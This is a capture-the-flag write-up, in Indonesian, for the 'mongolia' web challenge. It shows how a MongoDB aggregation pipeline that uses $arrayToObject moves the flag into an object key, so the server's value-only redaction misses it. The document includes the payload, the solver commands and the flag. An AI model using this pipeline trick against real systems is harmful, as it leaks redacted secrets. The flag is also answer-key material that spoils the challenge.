# Writeup - web/mongolia

## Ringkasan
Challenge ini kasih web yang bisa:
1. `POST /api/connect` untuk connect ke MongoDB remote dengan credential internal.
2. `GET /api/journals` untuk baca jurnal non-secret.
3. `POST /api/query` untuk jalankan aggregation pipeline user.

Data `secret:true` berisi `journal = FLAG` yang diulang 20x.
Server mencoba nyensor flag pakai `stripFlag()`, tapi hanya ke **value**, bukan **nama key object**.

## Vulnerability
Di `index.js` ada fungsi:

- `stripFlag(obj)`
- Kalau `obj` string -> replace `FLAG` jadi `[REDACTED]`
- Kalau `obj` object -> loop `for (const [k, v] of Object.entries(obj)) out[k] = stripFlag(v)`

Masalahnya: `k` (nama field) tidak pernah disanitasi.

Endpoint `POST /api/query` masih mengizinkan stage `$group`, dan operator `$arrayToObject` tidak masuk blacklist regex.
Artinya kita bisa bikin object dinamis dengan key dari field `$journal` (yang berisi flag).

## Payload Exploit
Pipeline yang dipakai:

```json
[
  {"$match": {"secret": true}},
  {"$limit": 1},
  {
    "$group": {
      "_id": {
        "$arrayToObject": [[{"k": "$journal", "v": 1}]]
      }
    }
  }
]
```

Hasilnya kurang lebih:

```json
[
  {
    "_id": {
      "squ1rrel{...}squ1rrel{...}...": 1
    }
  }
]
```

Karena flag ada di **key** object, `stripFlag()` tidak redaksi.
Lalu tinggal regex ambil token pertama `squ1rrel{...}`.

## Solver
File solver sudah disimpan di:
- `solver.py`

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
cd /home/nata/ctf/squ1rrel/web/mongolia/dist
python3 solver.py
```

Output:

```text
squ1rrel{3rli4nh0tu4h_zin4li?}
```

## Flag

```text
squ1rrel{3rli4nh0tu4h_zin4li?}
```
